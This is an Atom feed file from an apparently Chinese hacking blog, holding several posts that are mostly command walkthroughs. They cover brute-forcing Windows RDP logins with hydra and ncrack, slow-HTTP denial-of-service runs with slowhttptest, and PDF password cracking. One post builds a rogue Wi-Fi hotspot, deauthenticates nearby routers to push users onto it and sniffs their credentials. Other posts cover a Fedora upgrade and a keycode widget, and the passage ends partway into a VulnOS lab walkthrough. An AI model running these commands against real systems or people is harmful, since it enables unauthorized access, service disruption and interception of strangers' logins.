@@ -1,0 +1,677 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="http://jekyllrb.com" version="3.3.1">Jekyll</generator><link href="topspeedsnail.com/feed.xml" rel="self" type="application/atom+xml" /><link href="topspeedsnail.com/" rel="alternate" type="text/html" /><updated>2017-02-21T08:35:50+00:00</updated><id>topspeedsnail.com/</id><title type="html">Elephant And Balloon</title><subtitle>关于黑技术的小博客</subtitle><entry><title type="html">暴力破解Windows RDP(3389)</title><link href="topspeedsnail.com/brute-force-RDP-with-hydra-and-ncrack/" rel="alternate" type="text/html" title="暴力破解Windows RDP(3389)" /><published>2016-09-20T00:00:00+00:00</published><updated>2016-09-20T00:00:00+00:00</updated><id>topspeedsnail.com/brute-force-RDP-with-hydra-and-ncrack</id><content type="html" xml:base="topspeedsnail.com/brute-force-RDP-with-hydra-and-ncrack/">&lt;p&gt;RDP是远程桌面协议。&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ nmap your_target
+
+Starting Nmap 7.01 ( https://nmap.org ) at 2016-09-20 17:29 CST
+Nmap scan report for ns514636.ip-192-95-xx.net (192.95.xx.xx)
+Host is up (0.28s latency).
+Not shown: 988 closed ports
+PORT      STATE    SERVICE
+135/tcp   filtered msrpc
+139/tcp   filtered netbios-ssn
+445/tcp   filtered microsoft-ds
+593/tcp   filtered http-rpc-epmap
+3389/tcp  open     ms-wbt-server   # 这个是远程桌面端口
+4444/tcp  filtered krb524
+6667/tcp  filtered irc
+49152/tcp open     unknown
+49153/tcp open     unknown
+49154/tcp open     unknown
+49155/tcp open     unknown
+49163/tcp open     unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 28.14 seconds
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;使用hydra暴力破解：&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;hydra -t 4 -V -l administrator -P /usr/share/wordlists/rockyou.txt rdp://your_target
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;-t = TASKS run TASKS number of connects in parallel (per host, default: 16) RDP set to maximum of 4.
+-V = Verbose shows you the attempted passwords.
+-l = Username
+-P = Password list
+rdp:// = Port 3389
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;使用ncrack暴力破解：&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ncrack -p 3389 -v -user administrator -P /usr/share/wordlists/rockyou.txt 192.95.xx.xx
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;-p = Port number
+-v = Verbose shows you any found passwords in realtime
+-user = username
+-P = Password list
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;远程桌面登录：&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rdesktop your_target
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;</content><author><name></name></author><summary type="html">RDP是远程桌面协议。</summary></entry><entry><title type="html">Fedora 23 升级到 Fedora 24</title><link href="topspeedsnail.com/fedora23-update-to-fedora24/" rel="alternate" type="text/html" title="Fedora 23 升级到 Fedora 24" /><published>2016-06-30T00:00:00+00:00</published><updated>2016-06-30T00:00:00+00:00</updated><id>topspeedsnail.com/fedora23-update-to-fedora24</id><content type="html" xml:base="topspeedsnail.com/fedora23-update-to-fedora24/">&lt;p&gt;Fedora前几天发布了新版本24；本帖纪录怎么从Fedora 23升级到Fedora 24。&lt;/p&gt;
+
+&lt;p&gt;基本来说Fedora的升级有两种方法，一种是使用基于GUI的工具，另一种是使用终端命令行。&lt;/p&gt;
+
+&lt;p&gt;本帖主要介绍命令行方法，官方建议使用的方法是 &lt;strong&gt;dnf upgrade plugin&lt;/strong&gt;。&lt;/p&gt;
+
+&lt;h2 id=&quot;升级步骤&quot;&gt;升级步骤：&lt;/h2&gt;
+
+&lt;h3 id=&quot;确保fedora-23的软件包为最新&quot;&gt;确保Fedora 23的软件包为最新&lt;/h3&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;sudo dnf upgrade --refresh&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;h3 id=&quot;安装-dnf-plugin-system-upgrade&quot;&gt;安装 dnf-plugin-system-upgrade&lt;/h3&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;sudo dnf install dnf-plugin-system-upgrade&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;h3 id=&quot;开始升级&quot;&gt;开始升级&lt;/h3&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;sudo dnf system-upgrade download --releasever&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;24&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;你可以加入&lt;strong&gt;–allowerasing&lt;/strong&gt;选项，意思是移除有问题的软件包。&lt;/p&gt;
+
+&lt;h3 id=&quot;重启完成升级&quot;&gt;重启完成升级&lt;/h3&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;sudo dnf system-upgrade reboot&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;</content><author><name></name></author><summary type="html">Fedora前几天发布了新版本24；本帖纪录怎么从Fedora 23升级到Fedora 24。</summary></entry><entry><title type="html">JavaScript键码值</title><link href="topspeedsnail.com/javascript-keycode-lookup/" rel="alternate" type="text/html" title="JavaScript键码值" /><published>2016-06-27T00:00:00+00:00</published><updated>2016-06-27T00:00:00+00:00</updated><id>topspeedsnail.com/javascript-keycode-lookup</id><content type="html" xml:base="topspeedsnail.com/javascript-keycode-lookup/">&lt;p&gt;按下你要查询的健，返回键码。&lt;/p&gt;
+
+&lt;p&gt;&lt;input type=&quot;text&quot; maxlength=&quot;0&quot; size=&quot;2&quot; /&gt;&lt;/p&gt;
+
+&lt;script&gt;
+  window.addEventListener(&quot;keydown&quot;, function (event) {
+    document.getElementById(&quot;code&quot;).innerHTML = event.keyCode;
+    if (event.key) {
+      if (event.keyCode &gt; 47 &amp;&amp; event.keyCode &lt; 91) {
+        document.getElementById(&quot;char&quot;).innerHTML = &quot; - &quot; + String.toUpperCase(event.key);
+      } else {
+        document.getElementById(&quot;char&quot;).innerHTML = &quot; - &quot; + event.key;
+      }
+    }
+  }, false);
+&lt;/script&gt;
+
+&lt;p&gt;&lt;span id=&quot;code&quot; style=&quot;background-color: #faee95; font-size: 100;  border-style: solid; border-width: 5px; border-color: #848789&quot;&gt;&lt;/span&gt;
+&lt;span id=&quot;char&quot; style=&quot;font-size: 70;&quot;&gt;&lt;/span&gt;&lt;/p&gt;</content><author><name></name></author><summary type="html">按下你要查询的健，返回键码。</summary></entry><entry><title type="html">SlowHTTPTest-慢速DoS攻击</title><link href="topspeedsnail.com/SlowHTTPTest-dos-attack/" rel="alternate" type="text/html" title="SlowHTTPTest-慢速DoS攻击" /><published>2016-05-28T00:00:00+00:00</published><updated>2016-05-28T00:00:00+00:00</updated><id>topspeedsnail.com/SlowHTTPTest-dos-attack</id><content type="html" xml:base="topspeedsnail.com/SlowHTTPTest-dos-attack/">&lt;p&gt;Slowhttptest是一个依赖于实际HTTP协议的Slow HTTP DoS攻击工具，它的设计原理是要求服务器所有请求被完全接收后再进行处理。&lt;/p&gt;
+
+&lt;p&gt;SlowHTTPTest是一款对服务器进行慢攻击的测试软件，所谓的慢攻击就是相对于cc或者DDoS的快而言的，并不是只有量大速度快才能把服务器搞挂，使用慢攻击有时候也能到达同一效果。slowhttptest包含了之前几种慢攻击的攻击方式，包括slowloris, Slow HTTP POST, Slow Read attack等。那么这些慢攻击工具的原理就是想办法让服务器等待，当服务器在保持连接等待时，自然就消耗了资源。&lt;/p&gt;
+
+&lt;p&gt;Slowhttptest的源码托管在Github：&lt;a href=&quot;https://github.com/shekyan/slowhttptest&quot;&gt;https://github.com/shekyan/slowhttptest&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;在kali-linux上安装slowhttptest&quot;&gt;在Kali Linux上安装SlowHTTPTest&lt;/h2&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span class=&quot;c&quot;&gt;# apt-get install slowhttptest &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;如果你使用其他linux发行版，可以从源码编译安装：&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;./configure
+&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;make
+&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;sudo make install&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;h2 id=&quot;使用示例&quot;&gt;使用示例&lt;/h2&gt;
+
+&lt;p&gt;man手册：&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span class=&quot;c&quot;&gt;# man slowhttptest&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;帮助信息中提供了很多使用示例。&lt;/p&gt;
+
+&lt;h3 id=&quot;slowloris模式&quot;&gt;slowloris模式：&lt;/h3&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span class=&quot;c&quot;&gt;# slowhttptest -c 1000 -H -i 10 -r 200 -t GET -u https://yourtarget.com/index.html -x 24 -p 3&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/2016/5/Screen Shot 2016-05-28 at 18.18.13.png&quot; alt=&quot;SlowHTTPTest: 慢速DoS攻击&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;生成图表(CSV和html格式)：&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span class=&quot;c&quot;&gt;# slowhttptest -c 1000 -H -g -o my_header_stats -i 10 -r 200 -t GET -u https://yourtarget.com/index.html -x 24 -p 3&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;h3 id=&quot;slow-read模式&quot;&gt;Slow Read模式：&lt;/h3&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span class=&quot;c&quot;&gt;# slowhttptest -c 1000 -X -r 1000 -w 10 -y 20 -n 5 -z 32 -u http://yourtarget.com -p 5 -l 350 -e x.x.x.x:8080&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;x.x.x.x:8080是HTTP代理&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;实际测试&quot;&gt;实际测试&lt;/h3&gt;
+
+&lt;p&gt;Slow Body攻击：&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span class=&quot;c&quot;&gt;# slowhttptest -c 1000 -B -g -o my_body_stats -i 110 -r 200 -s 8192 -t FAKEVERB -u http://www.mywebsite.com -x 10 -p 3&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;攻击开始，服务器端在几秒内的变化：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/2016/5/Screen Shot 2016-05-28 at 18.29.22.png&quot; alt=&quot;SlowHTTPTest: 慢速DoS攻击&quot; /&gt;&lt;/p&gt;</content><author><name></name></author><summary type="html">Slowhttptest是一个依赖于实际HTTP协议的Slow HTTP DoS攻击工具，它的设计原理是要求服务器所有请求被完全接收后再进行处理。</summary></entry><entry><title type="html">使用pdfcrack破解PDF密码(Linux)</title><link href="topspeedsnail.com/crack-pdf-password-use-pdfcrack/" rel="alternate" type="text/html" title="使用pdfcrack破解PDF密码(Linux)" /><published>2016-05-25T00:00:00+00:00</published><updated>2016-05-25T00:00:00+00:00</updated><id>topspeedsnail.com/crack-pdf-password-use-pdfcrack</id><content type="html" xml:base="topspeedsnail.com/crack-pdf-password-use-pdfcrack/">&lt;p&gt;pdfcrack是破解PDF保护密码的Linux命令行工具。&lt;/p&gt;
+
+&lt;h3 id=&quot;安装pdfcrack&quot;&gt;安装pdfcrack&lt;/h3&gt;
+
+&lt;p&gt;Debian系列：&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span class=&quot;c&quot;&gt;# apt install pdfcrack&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/2016/5/Screen Shot 2016-05-26 at 09.09.08.png&quot; alt=&quot;破解PDF密码&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;暴力破解&quot;&gt;暴力破解&lt;/h3&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span class=&quot;c&quot;&gt;# pdfcrack -f filename.pdf -n 6 -m 8 -c 0123456789&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;暴力破解密码是漫长单调的过程。&lt;/p&gt;
+
+&lt;p&gt;上面使用的参数解释：&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;-n：密码最短多少个字符&lt;/li&gt;
+  &lt;li&gt;-m：密码最长多少个字符&lt;/li&gt;
+  &lt;li&gt;-c：使用的字符集&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;更多选项，查看帮助：&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span class=&quot;c&quot;&gt;# man pdfcrack&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;你可以随时使用 Ctrl+c 终止破解，它会保存破解的进度，下次继续在终止的地方执行。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/2016/5/Screen Shot 2016-05-26 at 09.25.11.png&quot; alt=&quot;破解PDF密码&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;使用密码字典&quot;&gt;使用密码字典&lt;/h3&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span class=&quot;c&quot;&gt;# pdfcrack -f high.pdf -w wordlist.txt&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/2016/5/Screen Shot 2016-05-26 at 09.30.58.png&quot; alt=&quot;破解PDF密码&quot; /&gt;&lt;/p&gt;</content><author><name></name></author><summary type="html">pdfcrack是破解PDF保护密码的Linux命令行工具。</summary></entry><entry><title type="html">创建假的wifi热点</title><link href="topspeedsnail.com/fake-wifi-access-point-and-capture-all-data/" rel="alternate" type="text/html" title="创建假的wifi热点" /><published>2016-05-24T00:00:00+00:00</published><updated>2016-05-24T00:00:00+00:00</updated><id>topspeedsnail.com/fake-wifi-access-point-and-capture-all-data</id><content type="html" xml:base="topspeedsnail.com/fake-wifi-access-point-and-capture-all-data/">&lt;p&gt;本帖介绍怎么创建假的wifi热点，然后抓取连接到这个wifi用户的敏感数据。我们还会给周围的无线路由器发送未认证的包，使这些路由器瘫痪，强迫用户连接（或自动连接）我们创建的假wifi热点。&lt;/p&gt;
+
+&lt;p&gt;这种攻击也叫”水坑攻击”－把其他用户都聚集到一个”坑”中。&lt;/p&gt;
+
+&lt;h2 id=&quot;系统要求&quot;&gt;系统要求：&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Kali Linux&lt;/li&gt;
+  &lt;li&gt;本地有线网络连接（网络接口 eth0）&lt;/li&gt;
+  &lt;li&gt;无线网卡支持包注入模式和监控模式 （网络接口 wlan0）&lt;/li&gt;
+  &lt;li&gt;各种抓包工具－Wireshark、 ettercap、tcpdump…&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;获得默认网关&quot;&gt;获得默认网关&lt;/h3&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span class=&quot;c&quot;&gt;# route -n&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/2016/5/Screen Shot 2016-05-23 at 18.50.18.png&quot; alt=&quot;创建假的wifi热点&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;这个值在设置iptables时会用到。&lt;/p&gt;
+
+&lt;h3 id=&quot;安装dhcp服务&quot;&gt;安装DHCP服务&lt;/h3&gt;
+
+&lt;p&gt;用处: 为连接假wifi的用户分配IP。&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span class=&quot;c&quot;&gt;# apt-get install isc-dhcp-server&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;配置DHCP：&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span class=&quot;c&quot;&gt;# vim /etc/dhcp/dhcpd.conf&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;文件中内容：&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;authoritative;
+default-lease-time 600;
+max-lease-time 7200;
+
+subnet 192.168.10.0 netmask 255.255.255.0 {
+   option routers 192.168.10.1;
+   option subnet-mask 255.255.255.0;
+   option domain-name &quot;freewifi&quot;;
+   option domain-name-servers 8.8.8.8,8.8.4.4,192.168.0.1;
+   range 192.168.10.100 192.168.10.140;
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;先不启动DHCP服务。&lt;/p&gt;
+
+&lt;h3 id=&quot;进入无线网卡的监控模式&quot;&gt;进入无线网卡的监控模式&lt;/h3&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span class=&quot;c&quot;&gt;# airmon-ng start wlan0&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# airmon-ng check kill&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;把wlan0替换为你的无线网卡接口。&lt;/p&gt;
+
+&lt;p&gt;要退出监控模式，执行：&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span class=&quot;c&quot;&gt;# airmon-ng stop wlan0mon&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;h3 id=&quot;创建wifi热点&quot;&gt;创建wifi热点&lt;/h3&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span class=&quot;c&quot;&gt;# airbase-ng -c 11 -e fake_wifi wlan0mon&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/2016/5/Screen Shot 2016-05-24 at 09.06.55.png&quot; alt=&quot;创建假的wifi热点&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;不要终止这个命令。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/2016/5/Screen Shot 2016-05-24 at 09.20.04.png&quot; alt=&quot;创建假的wifi热点&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;现在你已经创建了一个wifi热点，但是这个wifi目前还不能连接。&lt;/p&gt;
+
+&lt;h3 id=&quot;设置网络和防火墙规则&quot;&gt;设置网络和防火墙规则&lt;/h3&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# ifconfig at0 up
+# ifconfig at0 192.168.10.1 netmask 255.255.255.0
+# ifconfig at0 mtu 1400
+# route add -net 192.168.10.0 netmask 255.255.255.0 gw 192.168.10.1
+# iptables --flush
+# iptables --table nat --flush
+# iptables --delete-chain
+# iptables --table nat --delete-chain
+# echo 1 &amp;gt; /proc/sys/net/ipv4/ip_forward
+# iptables -t nat -A PREROUTING -p udp -j DNAT --to 192.168.0.1
+# iptables -P FORWARD ACCEPT
+# iptables --append FORWARD --in-interface at0 -j ACCEPT
+# iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h3 id=&quot;启动dhcp服务&quot;&gt;启动DHCP服务&lt;/h3&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span class=&quot;c&quot;&gt;# dhcpd -cf /etc/dhcp/dhcpd.conf -pf /var/run/dhcpd.pid at0&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# systemctl start isc-dhcp-server&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;遇到的问题：&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PID file: /var/run/dhcpd.pid
+Can't open lease database /var/lib/dhcp/dhcpd.leases: No such file or directory --
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;创建这个文件解决这个问题：&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span class=&quot;c&quot;&gt;# mkdir /var/lib/dhcp/&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# touch /var/lib/dhcp/dhcpd.leases&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;到此，wifi热点创建完成。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/2016/5/S60524-201256.jpg&quot; alt=&quot;创建假的wifi热点&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/2016/5/S60524-201355.jpg&quot; alt=&quot;创建假的wifi热点&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;瘫痪其他路由&quot;&gt;瘫痪其他路由&lt;/h3&gt;
+
+&lt;p&gt;列出周围的wifi：&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span class=&quot;c&quot;&gt;# airodump-ng wlan0mon&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;然后选择你的目标，记住BSSID和频道。&lt;/p&gt;
+
+&lt;p&gt;设置频道：&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span class=&quot;c&quot;&gt;# iwconfig wlan0mon channel &amp;lt;频道号&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;开始deauthentication攻击：&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span class=&quot;c&quot;&gt;# aireplay-ng -0 5000 -a &amp;lt;BSSID&amp;gt; wlan0mon --ignore-negative-one&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;OK，现在你可以愉快的抓包了。&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;例如使用Wireshark抓包：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/2016/5/Screenshot from 2016-05-24 20-12-12.png&quot; alt=&quot;创建假的wifi热点&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;上图抓到了我手机邮件客户端登录的邮箱账户。&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;更多：&lt;a href=&quot;https://github.com/tiancode/learn-hacking&quot;&gt;https://github.com/tiancode/learn-hacking&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;</content><author><name></name></author><summary type="html">本帖介绍怎么创建假的wifi热点，然后抓取连接到这个wifi用户的敏感数据。我们还会给周围的无线路由器发送未认证的包，使这些路由器瘫痪，强迫用户连接（或自动连接）我们创建的假wifi热点。</summary></entry><entry><title type="html">黑技能测试：攻破VulnOS 2</title><link href="topspeedsnail.com/hack-vulnos-for-test-your-skill/" rel="alternate" type="text/html" title="黑技能测试：攻破VulnOS 2" /><published>2016-05-23T00:00:00+00:00</published><updated>2016-05-23T00:00:00+00:00</updated><id>topspeedsnail.com/hack-vulnos-for-test-your-skill</id><content type="html" xml:base="topspeedsnail.com/hack-vulnos-for-test-your-skill/">&lt;p&gt;VulnOS是人为打包的带漏洞的操作系统镜像，用来测试渗透技能。&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://www.vulnhub.com/entry/vulnos-2,147/&quot;&gt;VulnOS&lt;/a&gt;是Virtualbox虚拟机镜像。&lt;/p&gt;
+
+&lt;p&gt;你的任务是获得这个系统的root权限。&lt;/p&gt;
+
+&lt;p&gt;VulnOS镜像下载地址：&lt;a href=&quot;http://download.vulnhub.com/vulnos/VulnOSv2.7z&quot;&gt;http://download.vulnhub.com/vulnos/VulnOSv2.7z&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;攻破步骤：&lt;a href=&quot;https://github.com/dqi/ctf_writeup/tree/master/boot2root/vulnos2&quot;&gt;https://github.com/dqi/ctf_writeup/tree/master/boot2root/vulnos2&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Lets scan it:&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;_ nmap -sS -T4 -A 192.168.0.100 -p-
+
+Starting Nmap 7.12 ( https://nmap.org ) at 2016-05-17 08:49 CEST
+Nmap scan report for 192.168.0.100
+Host is up (0.00064s latency).
+Not shown: 65532 closed ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.6 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   1024 f5:4d:c8:e7:8b:c1:b2:11:95:24:fd:0e:4c:3c:3b:3b (DSA)
+|   2048 ff:19:33:7a:c1:ee:b5:d0:dc:66:51:da:f0:6e:fc:48 (RSA)
+|_  256 ae:d7:6f:cc:ed:4a:82:8b:e8:66:a5:11:7a:11:5f:86 (ECDSA)
+80/tcp   open  http    Apache httpd 2.4.7 ((Ubuntu))
+|_http-server-header: Apache/2.4.7 (Ubuntu)
+|_http-title: VulnOSv2
+6667/tcp open  irc     ngircd
+MAC Address: 08:00:27:A1:E2:43 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
